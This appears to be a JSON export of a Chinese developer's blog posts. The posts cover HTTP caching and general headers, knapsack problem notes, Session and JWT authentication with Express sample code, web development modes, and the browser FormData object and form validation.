由服务器返回的响应中，若报文首部字段Cache-Control中对no-cache字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。相反，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数 no-store指令Cache-Control:no-store 当使用no-store指令时，暗示请求（和对应的响应）或响应中包含机密信息，因此该指令规定缓存不能在本地存储请求或响应的任何一部分 s-maxage指令Cache-Control:s-maxage=604800(单位：秒) s-maxage指令的功能和max-age指令相同，不同点在于s-maxage指令只适用于供多位用户使用的公共缓存服务器，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。 当使用s-maxage指令后，则直接忽略对Expires首部字段及max-age指令的处理 max-age指令Cache-Control:max-age=604800(单位：秒) 客户端：当客户端发送的请求中包含max-age指令时，如果判定缓存时间的数值比·1指定时间的数值更小，那么客户端就接收缓存的资源。当指定的max-age=0，那么缓存服务器通常将请求转发给源服务器 服务端：服务器返回的响应中包含max-age指令，缓存服务器将不对资源的有效性再作确认，而max-zge数值代表资源保存为缓存的最长时间 ⚠应用HTTP/1.1版本的缓存服务器在遇到同时存在Expires首部字段的情况时，会优先处理max-age指令,而忽略Expires首部字段，而HTTP/1.0版本的缓存服务器则相反，max-age指令被忽略 min-fresh指令Cache-Control:min-fresh=60 min-fresh指令要求缓存服务器返回至少还未过指定时间的缓存资源。 max-stale指令Cache-Control:max-stale=3600 使用max-stale指示缓存资源，即使过期也照常接收 如果指令未指定参数值，那么无论过多久，客户端都会接收响应；如果指令中指定了具体数值，那么即使过期，只要仍处于max-stale指定的时间内仍旧会被客户端接收 only-if-cached指令Cache-Control:only-if-cached 表示客户端仅在缓存服务器本地缓存目标资源的情况下才要求其返回。该指令要求服务器不重新加载响应，也不再次确认资源有效性。若请求缓存服务器的本地缓存无响应，则返回状态码504 Gateway Timeout must-revalidate指令Cache-Control:must-revalidate 代理向源服务器再次验证即将返回的响应缓存目前是否仍然有效。如果代理无法连通服务器再次活期有效资源，缓存必须给客户端一条504状态码 使用must-revalidate指令忽略请求的max-stale指令，即使首部使用了max-stale，也不会有效果 proxy-revalidate指令Cache-Control：proxy-revalidate proxy-revalidate要求所有缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性 no-transform指令Cache-Control：no-transform 无论·是在请求还是响应中使用，缓存都不能改变实体主体的媒体类型，这样可防止代理压缩图片等类似操作 Cache-Control扩展cache-control token Cache-Control:private,community=”UCI” 通过cache-extension标记可以扩展Cache-Control首部字段内的指令。如例子，Cache-Control首部字段本身没有community这个指令。借助extensions tokens实现了该指令的添加。如果缓存服务器无法理解这个新指令就会直接忽略 Connection作用： 控制不再转发给代理的首部字段 管理持久连接 Connection:不再转发的首部字段名 控制不再转发给代理的首部字段在客户端发送请求和服务器返回响应内，使用Connection首部字段，可控制不再转发给代理的首部字段 管理持久连接Connection:close HTTP/1.1版本的默认连接是持久连接，为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，指定Connection首部字段为Close HTTP/1.1之前的版本默认连接是非持久连接。因此，如果想要在旧版本的HTTP协议上维持持续连接，则需要指定Connection为Kepp-Alive PragmaPragma是HTTP/1.1之前版本的历史遗留字段，仅作为与HTTP/1.0的向后兼容而定义 Pragma:no-cache 该首部字段属于通用首部字段，但只用在客户端发送请求中。客户端要求所有的中间服务器不返回缓存的资源。所有中间服务器如果都能以HTTP/1.1为基准，那直接采用Cache-Control:no-cache指定缓存的处理方式是最为理想的。但要整体掌握中间服务器使用的HTTP协议版本不现实，发送请求一般同时包含两个首部字段 Cache-Control:no-cache Pragma:no-cache Trailer首部字段Trailer会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在HTTP/1.1版本分块传输编码时 Trailer:Expires —(报文主体)— Expires:Tue,28 Sep 2004 23:59:59 GMT Transfer-Encoding规定了传输报文主体时采用的编码方式 HTTP/1.1的传输编码方式仅对分块传输编码有效 Upgrade Upgrade用于检测HTTP协议及其他协议是否可使用更高的版本进行同心，其参数值用来指定一个完全不同的通信协议 12345678客户端=》服务器GET/index.html HTTP/1.1Upgrade:TLS/1.0Connection:Upgrade服务器=》客户端HTTP/1.1 101 Switching ProtocolsUpgrade:TLS/1.0,HTTP/1.1Connection:Upgrade Connection的值被指定为Upgrade,Upgrade的首部字段产生作用的Upgrade对象仅限于客户端和邻接服务器之间。因此使用首部字段Upgrade时需要额外指定Connection为Upgrade Via使用Via是为了追踪客户端和服务器之间的请求和响应报文的传输路径 报文经过代理或网关时，会现在首部字段Via中附加该服务器的信息，然后再进行转发。Via不仅用于追踪报文的转发，还可避免请求回环的发生，所以必须在经过代理时附加该首部字段内容 WarningHTTP/1.1的Warning首部是从HTTP/1.0的响应首部（Retry-After)演变过来的，该首部会告知用户一些与缓存相关的问题的警告 &amp;eg: Warning:113 gw.hackr.jp:8080 “Heuristic expiration” Tue,03 Jul=&gt;2012 05:09:44 GMT Warning:【警告码】【警告主机：端口号】“【警告内容】”（【日期时间】） HTTP/1.1警告码 警告码 警告内容 说明 110 Response is stale(响应已过期) 代理返回已过期的资源 111 Revalidation failed(再验证失败) 代理验证资源有效性时失败（服务器无法到达等原因 112 Disconnection operation(断开连接操作) 代理与互联网连接故意切断 113 Heuristic expiration(试探性过期) 响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下） 199 Miscellaneous warning(杂项警告) 任意警告内容 214 Transformation applied(使用了转换) 代理对内容编码或媒体类型等执行了某些处理时 299 Miscellaneous persistent warning(持久杂项警告) 任意警告内容","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"HTTP","slug":"计算机网络/HTTP","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/"}],"tags":[]},{"title":"背包问题","slug":"背包问题","date":"2022-04-04T04:01:42.000Z","updated":"2022-04-08T09:19:01.103Z","comments":true,"path":"2022/04/04/背包问题/","link":"","permalink":"https://coloey.github.io/2022/04/04/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/","excerpt":"","text":"01背包：有限物品数量 二维01背包问题，两个for循环可以交换顺序，内层for循环方向可以顺序循环 一维01背包问题：因为物品数量有限，内层for循环不能重复取，必须倒序，两个for循环可以交换顺序 完全背包问题：物品可以重复取 二维：for循环可以交换顺序，内层for循环必须顺序，因为物品可以重复取 一维：for循环可以交换顺序，内层for循环必须顺序，因为物品可以重复取 求方法数：dp[j]+=dp[j-nums[i]] 一维：求组合数：先遍历物品再遍历背包 求排列数：先遍历背包再遍历物品","categories":[{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"前后端身份认证","slug":"前后端身份认证","date":"2022-03-21T06:10:19.000Z","updated":"2022-08-17T15:59:32.655Z","comments":true,"path":"2022/03/21/前后端身份认证/","link":"","permalink":"https://coloey.github.io/2022/03/21/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/","excerpt":"","text":"不同身份认证方案：服务端渲染推荐使用Session认证机制 前后端分离推荐使用JWT认证机制 Session认证机制 Cookie:Cookie是存储在用户浏览器中一段不超过4kb的字符串，它由一个名称（Name),y一个值(Value)和几个用于控制Cookie有效期，安全性，使用范围的可选属性组成 不同域名下的Cookie各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的Cookie一同发送到服务器。 Cookie的几大特性： 自动发送 域名独立 过期时限 4kb限制 浏览器可以设置不接受Cookie，也可以设置不向服务器发送Cookie,window.navigator.cookieEnabled属性返回一个布尔值，表示浏览器是否打开cookie功能 两个域名只要域名相同和端口相同就可以共享Cookie,也就是说http://example.com设置的Cookie可以被https://example.com读取 Cookie在身份认证中的作用：客户端第一次请求服务器时，服务器通过响应头Set-Cookie的形式，向客户端发送一个身份认证的Cookie，客户端会自动将Cookie保存在浏览器中，随后，当客户端浏览器每次请求服务器时浏览器会自动将身份认证相关的Cookie，通过请求头的形式发送给服务器Cookie:foo=bar，服务器即可验证客户端身份 Cookie的属性Expires,Max-Age:Expires属性指定一个具体的到齐时间，到了指定时间后，浏览器就不再保留这个Cookie,它的值时UTC格式，可以使用Date.prototype.toUTCString()进行格式转换 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 如果不设置该属性，或者设置为null,Cookie只在当前会话有效，浏览器窗口一旦关闭，当前Session结束，该Cookie被删除，另外，浏览器根据本地时间，觉得Cookie是否过期，由于本地时间不精确，没有办法保证Cookie一旦会在服务器指定时间过期 Max-Age属性指定从现在开始Cookie存在的描述，即过了这个时间后，浏览器就不再保留这个Cookie,如果同时指定Expires和Max-Age,那么Max-Age的值优先生效 Domain,PathDomain属性指定浏览器发出Http请求时，哪些域名要附带这个Cookie，如果没有指定该属性，浏览器会默认将其设为当前URL的一级域名，比如www.example.com会设为example.com,而且以后如果访问example.com的任何子域名，HTTP请求也会带上这个Cookie,如果服务器在Set-Cookie字段指定的域名不属于当前域名，浏览器会拒绝这个Cookie Path属性指定指定浏览器发出HTTP请求时哪些路径要附带这个Cookie,只要浏览器发现，Path属性是HTTP请求路径的开头一部分，就会在头信息里面带上这个Cookie，比如PATH属性时/，那么请求/docs路径也会包含该Cookie，当然，前提是域名必须一致 Secure,HttpOnlySecure属性指定浏览器在加密协议HTTPS下，才能将这个Cookie发送到服务器，另一方面，如果当前协议是HTTP，浏览器会自动忽略服务器发来的Secure属性，该属性只是一个开关，不需要指定值，如果通信时HTTS协议，开关自动打开 HttpOnly属性指定该Cookie无法通过JavaScript脚本拿到，主要是Document.cookie属性，XMLHttpRequest对象和Request API都拿不到该属性，这样就防止了该Cookie被脚本读到，只有浏览器发出HTTP请求时才会带上该Cookie Cookie具有不安全性由于Cookie是存储在浏览器中的，因此浏览器也提供了读写Cookie的API，因此Cookie很容易被伪造，不具有安全性，因此Cookie不能存放重要隐私数据 Session工作原理： 客户端把用户ID和密码等登陆信息放入报文的实体部分，通常是以POST请求发送给服务器，而这时使用HTTPS通信来进行HTML表单画面的显示和用户输入数据的发送 服务器会发放用以识别用户的Session ID,通过验证从客户端送过来的登录信息进行身份认证，人后把用户认证状态与Session ID绑定后记录在服务器端，向客户端返回响应时，会在首部字段Set-Cookie内写入Sessin ID,为避免SessionId被盗，可在Cookie中加入httponly属性 客户端接收到从服务器发来的Session ID后，会将其作为Cookie保存哎本地，下次向服务器发送请求时，浏览器自动发送Cookie,服务器通过验证接收到的Session ID识别用户和其认证状态 Session认证需要配合Cookie实现，由于Cookie默认不支持跨域访问，所以当涉及前端跨域请求后端接口时需要做额外配置。因此当前端请求后端接口不涉及跨域请求时推荐使用Session身份认证机制，否则使用JWT认证 流程： 浏览器登录发送账号密码，服务端查询用户库，校验用户 服务端把用户登录状态存为Session,生成一个sessionId 通过登录把接口返回，把sessionId set到cookie上 此后浏览器再请求业务接口，sessionId随cookie带上 服务端查sessionId检验session 成功后正常做业务处理，返回结果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061const express=require(&#x27;express&#x27;);const session=require(&#x27;express-session&#x27;);const cors=require(&#x27;cors&#x27;);const bodyParser=require(&#x27;body-parser&#x27;)//var formParser=require(&#x27;express-formidable&#x27;)const app=express();app.use(cors());app.use( session(&#123; secret:&#x27;xiaoqi&#x27;, resave:false, saveUninitialized:true &#125;))//托管静态页面app.use(express.static(&#x27;./pages&#x27;));//自定义解析Post提交过来的表单数据app.use(bodyParser.urlencoded(&#123;extended:false&#125;))app.use(bodyParser.json())//登录API接口app.post(&#x27;/api/login&#x27;,(req,res)=&gt;&#123; //判断用户提交的登录信息是否正确 console.log(req.body) if(req.body.username!==&quot;admin&quot;||req.body.password!==&quot;888888&quot;)&#123; return res.send(&#123;status:1,msg:&#x27;登录失败&#x27;&#125;) &#125; //登录成功则把信息存储在Session中 console.log(req.body); req.session.user=req.body;//用户登录信息 req.session.islogin=true;//用户登录状态 res.send(&#123;status:0,msg:&#x27;登录成功&#x27;&#125;)&#125;)//获取用户姓名的接口app.get(&#x27;/api/username&#x27;,(req,res)=&gt;&#123; //从Session中获取用户姓名响应给客户端 if(!req.session.islogin)&#123; return res.send(&#123;status:1,msg:&#x27;fail&#x27;&#125;) &#125; res.send(&#123; status:0, msg:&#x27;success&#x27;, username:req.session.user.username, &#125;)&#125;)//退出登录的接口app.post(&#x27;/api/logout&#x27;,(req,res)=&gt;&#123; //清空当前客户端的session信息 req.session.destroy() res.send(&#123; status:0, msg:&#x27;退出登录成功&#x27; &#125;)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;) JWT认证机制：工作原理 jwt组成部分：头部.有效荷载.签名 Header.PayLoad.Signature 头部由两部分组成：令牌类型即JWT，以及正在使用的签名算法，例如HMAC SHA256或RSA 例如： 12345&#123; &quot;alg&quot;:&quot;HS256&quot;, &quot;typ&quot;:&quot;JWT&quot; &#125; 这个JSON被Base64Url编码形成JWT第一部分 有效载荷： 包含声明，声明式关于实体（通常是用户）和附加数据的陈述， 身份认证中：当用户使用凭据成功登录后，将返回一个JSON Web Token,由于token是凭据，因此要小心出现安全问题，通常，不应该将令牌保留超过所需的时间，也不应该将敏感数据存储在浏览器存储中，token在Authorization标头中发送，则跨域资源共享不会成为问题，因为它不使用cookie 客户端收到服务器返回的JWT后，通常会将它存储在localStorage或者sessionStorage中，此后客户端每次与服务端通信，都要带上这个JWT的字符串，进行身份认证，推荐把JWT放在Http请求头的Authorization字段中 Authorization：Bearer 为什么使用JWT：应用程序可以使用访问access token去访问受保护的资源，比如一个接口 在Express中使用JWT，express-jwt会自动把JWT的payload部分赋值于req.user,方便逻辑部分调用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869const express=require(&#x27;express&#x27;);const app=express();const cors=require(&#x27;cors&#x27;);//导入用于生成jwt字符串的包const jwt=require(&#x27;jsonwebtoken&#x27;);//导入用于将客户端发送过来的JWT字符串解析还原成JSON对象的包const expressJWT=require(&quot;express-jwt&quot;);//秘钥的本质是字符串const secretkey=&#x27;xiaochunzuishuai^_^&#x27;;//以/api/开头的不用权限，配置成功了express-jwt这个中间件，就可以把解析出来的用户信息挂载到req.user上app.use(expressJWT(&#123; secret:secretkey, algorithms: [&#x27;HS256&#x27;], &#125;).unless(&#123;path:[/^\\/api\\//]&#125;))const bodyParser=require(&#x27;body-parser&#x27;)app.use(cors());//托管静态页面app.use(express.static(&#x27;./pages&#x27;));//自定义解析Post提交过来的表单数据app.use(bodyParser.urlencoded(&#123;extended:false&#125;))app.use(bodyParser.json())//登录API接口app.post(&#x27;/api/login&#x27;,(req,res)=&gt;&#123; //判断用户提交的登录信息是否正确 const userInfo=req.body; if(userInfo.username!==&quot;admin&quot;||userInfo.password!==&quot;888888&quot;)&#123; return res.send(&#123;status:1,msg:&#x27;登录失败&#x27;&#125;) &#125; //登录成功生成JWT字符串，通过token属性响应给客户端 res.send(&#123; satus:0, msg:&#x27;success&#x27;, //不要把密码加密到token字符串中 token:jwt.sign(&#123;username:userInfo.username&#125;,secretkey,&#123;expiresIn:&#x27;100s&#x27;&#125;), data:req.user &#125;)&#125;)//有权限的接口,配置成功了express-jwt这个中间件，有权限的接口就可以通过req.user获取解析出来的用户信息app.get(&#x27;/admin/getInfo&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0, msg:&#x27;success&#x27;, data:req.user &#125;)&#125;)//退出登录的接口app.post(&#x27;/api/logout&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0, msg:&#x27;退出登录成功&#x27; &#125;)&#125;)//配置全局错误处理中间件app.use((err,req,res,next)=&gt;&#123; //token解析失败导致的错误,Token过期或不合法 if(err.name===&#x27;UnauthorizedError&#x27;)&#123; return res.send(&#123;status:401,message:&#x27;无效的token&#x27;&#125;) &#125; //其他原因导致的错误 res.send(&#123;status:500,message:&#x27;未知错误&#x27;&#125;)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;)","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"Web开发模式","slug":"Web开发模式","date":"2022-03-21T05:52:34.000Z","updated":"2022-03-21T06:09:19.188Z","comments":true,"path":"2022/03/21/Web开发模式/","link":"","permalink":"https://coloey.github.io/2022/03/21/Web%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"Web开发模式：服务端渲染的Web开发模式服务器发送给客户端的HTML页面是通在服务器通过字符串的拼接动态生成的。因此客户端不需要通过Ajax技术额外请求页面的数据 优点： 前端耗时少，因为服务端通过动态生成HTML内容，浏览器只需要直接渲染页面即可，尤其是移动端，更省电 有利于SEO，服务器响应的是完整的HTML页面，所以爬虫更容易获取信息，有利于SEO 缺点： 占用服务器资源，如果请求较多，会对服务器造成一定压力 不利于前后端分离，开发效率低。使用服务端渲染，则无法进行分工合作，尤其对于前端复杂的项目，不利于羡慕高效开发 前后端分离的Web开发模式：依赖于Ajax技术，后端负责接口开发，前端使用Ajav=x调用接口的开发模式 优点： 开发体验好，前端专注于UI开发，后端专注于接口开发 用户体验好，Ajax技术的应用，提高用户的体验，轻松实现局部页面刷新 减轻服务端的渲染压力，页面最终是在浏览器中生成的 缺点： 不利于SEO，完整的HTML页面需要在客户端动态拼接，所有爬虫无法提取页面有效信息，解决方法：利用Vue,React等前端框架的SSR技术解决 如何选择Web开发模式： 看业务场景 主要功能是展示页面且没有复杂交互并且需要良好的SEO，用服务端渲染 后台管理项目等交互性强用前后端分离 一般两者都会一起用","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"FormData","slug":"FormData","date":"2022-03-21T03:13:21.000Z","updated":"2022-08-25T02:12:42.304Z","comments":true,"path":"2022/03/21/FormData/","link":"","permalink":"https://coloey.github.io/2022/03/21/FormData/","excerpt":"","text":"表单，FormData 对象目录 [隐藏] 表单概述 FormData 对象 概述 实例方法 表单的内置验证 自动校验 checkValidity() willValidate 属性 validationMessage 属性 setCustomValidity() validity 属性 表单的 novalidate 属性 enctype 属性 文件上传 参考链接 表单概述表单（&lt;form&gt;）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JavaScript 与表单的交互。 12345678910111213&lt;form action=&quot;/handling-page&quot; method=&quot;post&quot;&gt; &lt;div&gt; &lt;label for=&quot;name&quot;&gt;用户名：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;user_name&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;passwd&quot;&gt;密码：&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;passwd&quot; name=&quot;user_passwd&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;提交&quot; /&gt; &lt;/div&gt;&lt;/form&gt; 上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。 用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的name属性，键值是控件的value属性，键名和键值之间由等号连接。比如，用户名输入框的name属性是user_name，value属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对user_name=张三。 所有的键值对都会提交到服务器。但是，提交的数据格式跟&lt;form&gt;元素的method属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如/handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交。下面就是 GET 请求的 HTTP 头信息。 12GET /handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交Host: example.com 如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如user_name=张三&amp;user_passwd=123&amp;submit_button=提交。下面就是 POST 请求的头信息。 123456POST /handling-page HTTP/1.1Host: example.comContent-Type: application/x-www-form-urlencodedContent-Length: 74user_name=张三&amp;user_passwd=123&amp;submit_button=提交 注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“提交”），浏览器会自动对其进行编码。 点击submit控件，就可以提交表单。 123&lt;form&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt; 上面表单就包含一个submit控件，点击这个控件，浏览器就会把表单数据向服务器提交。 注意，表单里面的&lt;button&gt;元素如果没有用type属性指定类型，那么默认就是submit控件。 123&lt;form&gt; &lt;button&gt;提交&lt;/button&gt;&lt;/form&gt; 上面表单的&lt;button&gt;元素，点击以后也会提交表单。 除了点击submit控件提交表单，还可以用表单元素的submit()方法，通过脚本提交表单。 1formElement.submit(); 表单元素的reset()方法可以重置所有控件的值（重置为默认值）。 1formElement.reset() FormData 对象概述表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成这个过程，构造或编辑表单的键值对，然后通过脚本发送给服务器。浏览器原生提供了 FormData 对象来完成这项工作。 FormData()首先是一个构造函数，用来生成表单的实例。 1var formdata = new FormData(form); FormData()构造函数的参数是一个 DOM 的表单元素，构造函数会自动处理表单的键值对。这个参数是可选的，如果省略该参数，就表示一个空的表单。 下面是一个表单。 123456789101112131415&lt;form id=&quot;myForm&quot; name=&quot;myForm&quot;&gt; &lt;div&gt; &lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;useracc&quot;&gt;账号：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;useracc&quot; name=&quot;useracc&quot;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;userfile&quot;&gt;上传文件：&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;userfile&quot; name=&quot;userfile&quot;&gt; &lt;/div&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit!&quot;&gt;&lt;/form&gt; 我们用FormData()处理上面这个表单。 12345678910var myForm = document.getElementById(&#x27;myForm&#x27;);var formData = new FormData(myForm);// 获取某个控件的值formData.get(&#x27;username&#x27;) // &quot;&quot;// 设置某个控件的值formData.set(&#x27;username&#x27;, &#x27;张三&#x27;);formData.get(&#x27;username&#x27;) // &quot;张三&quot; 实例方法FormData 提供以下实例方法。 FormData.get(key)：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。 FormData.getAll(key)：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。 FormData.set(key, value)：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。 FormData.delete(key)：删除一个键值对，参数为键名。 FormData.append(key, value)：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。 FormData.has(key)：返回一个布尔值，表示是否具有该键名的键值对。 FormData.keys()：返回一个遍历器对象，用于for...of循环遍历所有的键名。 FormData.values()：返回一个遍历器对象，用于for...of循环遍历所有的键值。 FormData.entries()：返回一个遍历器对象，用于for...of循环遍历所有的键值对。如果直接用for...of循环遍历 FormData 实例，默认就会调用这个方法。 下面是get()、getAll()、set()、append()方法的例子。 123456789var formData = new FormData();formData.set(&#x27;username&#x27;, &#x27;张三&#x27;);formData.append(&#x27;username&#x27;, &#x27;李四&#x27;);formData.get(&#x27;username&#x27;) // &quot;张三&quot;formData.getAll(&#x27;username&#x27;) // [&quot;张三&quot;, &quot;李四&quot;]formData.append(&#x27;userpic[]&#x27;, myFileInput.files[0], &#x27;user1.jpg&#x27;);formData.append(&#x27;userpic[]&#x27;, myFileInput.files[1], &#x27;user2.jpg&#x27;); 下面是遍历器的例子。 12345678910111213141516171819202122232425262728var formData = new FormData();formData.append(&#x27;key1&#x27;, &#x27;value1&#x27;);formData.append(&#x27;key2&#x27;, &#x27;value2&#x27;);for (var key of formData.keys()) &#123; console.log(key);&#125;// &quot;key1&quot;// &quot;key2&quot;for (var value of formData.values()) &#123; console.log(value);&#125;// &quot;value1&quot;// &quot;value2&quot;for (var pair of formData.entries()) &#123; console.log(pair[0] + &#x27;: &#x27; + pair[1]);&#125;// key1: value1// key2: value2// 等同于遍历 formData.entries()for (var pair of formData) &#123; console.log(pair[0] + &#x27;: &#x27; + pair[1]);&#125;// key1: value1// key2: value2 表单的内置验证自动校验表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。 1234567891011121314151617&lt;!-- 必填 --&gt;&lt;input required&gt;&lt;!-- 必须符合正则表达式 --&gt;&lt;input pattern=&quot;banana|cherry&quot;&gt;&lt;!-- 字符串长度必须为6个字符 --&gt;&lt;input minlength=&quot;6&quot; maxlength=&quot;6&quot;&gt;&lt;!-- 数值必须在1到10之间 --&gt;&lt;input type=&quot;number&quot; min=&quot;1&quot; max=&quot;10&quot;&gt;&lt;!-- 必须填入 Email 地址 --&gt;&lt;input type=&quot;email&quot;&gt;&lt;!-- 必须填入 URL --&gt;&lt;input type=&quot;URL&quot;&gt; 如果一个控件通过验证，它就会匹配:valid的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配:invalid的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。 1234567input:invalid &#123; border-color: red;&#125;input,input:valid &#123; border-color: #ccc;&#125; checkValidity()除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有checkValidity()方法，用于手动触发校验。 12345// 触发整个表单的校验form.checkValidity()// 触发单个表单控件的校验formControl.checkValidity() checkValidity()方法返回一个布尔值，true表示通过校验，false表示没有通过校验。因此，提交表单可以封装为下面的函数。 1234567function submitForm(action) &#123; var form = document.getElementById(&#x27;form&#x27;); form.action = action; if (form.checkValidity()) &#123; form.submit(); &#125;&#125; willValidate 属性控件元素的willValidate属性是一个布尔值，表示该控件是否会在提交时进行校验。 1234567// HTML 代码如下// &lt;form novalidate&gt;// &lt;input id=&quot;name&quot; name=&quot;name&quot; required /&gt;// &lt;/form&gt;var input = document.querySelector(&#x27;#name&#x27;);input.willValidate // true validationMessage 属性控件元素的validationMessage属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。 该控件不会在提交时自动校验 该控件满足校验条件 1234// HTML 代码如下// &lt;form&gt;&lt;input type=&quot;text&quot; required&gt;&lt;/form&gt;document.querySelector(&#x27;form input&#x27;).validationMessage// &quot;请填写此字段。&quot; 下面是另一个例子。 1234var myInput = document.getElementById(&#x27;myinput&#x27;);if (!myInput.checkValidity()) &#123; document.getElementById(&#x27;prompt&#x27;).innerHTML = myInput.validationMessage;&#125; setCustomValidity()控件元素的setCustomValidity()方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。 这个方法可以替换浏览器内置的表单验证报错信息，参数就是要显示的报错信息。 12345678910&lt;form action=&quot;somefile.php&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; pattern=&quot;[a-z]&#123;1,15&#125;&quot; id=&quot;username&quot; &gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; 上面的表单输入框，要求只能输入小写字母，且不得超过15个字符。如果输入不符合要求（比如输入“ABC”），提交表单的时候，Chrome 浏览器会弹出报错信息“Please match the requested format.”，禁止表单提交。下面使用setCustomValidity()方法替换掉报错信息。 123456var input = document.getElementById(&#x27;username&#x27;);input.oninvalid = function (event) &#123; event.target.setCustomValidity( &#x27;用户名必须是小写字母，不能为空，最长不超过15个字符&#x27; );&#125; 上面代码中，setCustomValidity()方法是在invalid事件的监听函数里面调用。该方法也可以直接调用，这时如果参数不为空字符串，浏览器就会认为该控件没有通过校验，就会立刻显示该方法设置的报错信息。 1234567891011121314151617181920/* HTML 代码如下&lt;form&gt; &lt;p&gt;&lt;input type=&quot;file&quot; id=&quot;fs&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt;&lt;/form&gt;*/document.getElementById(&#x27;fs&#x27;).onchange = checkFileSize;function checkFileSize() &#123; var fs = document.getElementById(&#x27;fs&#x27;); var files = fs.files; if (files.length &gt; 0) &#123; if (files[0].size &gt; 75 * 1024) &#123; fs.setCustomValidity(&#x27;文件不能大于 75KB&#x27;); return; &#125; &#125; fs.setCustomValidity(&#x27;&#x27;);&#125; 上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。 validity 属性控件元素的属性validity属性返回一个ValidityState对象，包含当前校验状态的信息。 该对象有以下属性，全部为只读属性。 ValidityState.badInput：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。 ValidityState.customError：布尔值，表示是否已经调用setCustomValidity()方法，将校验信息设置为一个非空字符串。 ValidityState.patternMismatch：布尔值，表示用户输入的值是否不满足模式的要求。 ValidityState.rangeOverflow：布尔值，表示用户输入的值是否大于最大范围。 ValidityState.rangeUnderflow：布尔值，表示用户输入的值是否小于最小范围。 ValidityState.stepMismatch：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。 ValidityState.tooLong：布尔值，表示用户输入的字数超出了最长字数。 